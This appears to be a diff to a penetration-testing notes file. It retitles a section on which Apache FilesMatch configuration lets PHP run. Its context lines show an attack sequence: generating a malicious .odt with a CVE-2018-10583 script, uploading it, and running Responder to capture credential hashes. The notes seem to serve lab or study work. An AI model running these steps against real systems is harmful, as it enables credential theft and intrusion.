@@ -120,8 +120,10 @@ python3 CVE-2018-10583.py >> bad.odt
 Upload bad.odt 
 sudo responder -I tun0 -A 
 ```
-### Vulnerable Web Server Configurations
+### Factor which determines code execution of php
 ```
+/etc/apache2/mods-enabled/php7.4.conf for the Apache2 web server:
+
 <FilesMatch ".+\.ph(ar|p|tml)">
     SetHandler application/x-httpd-php
 </FilesMatch>
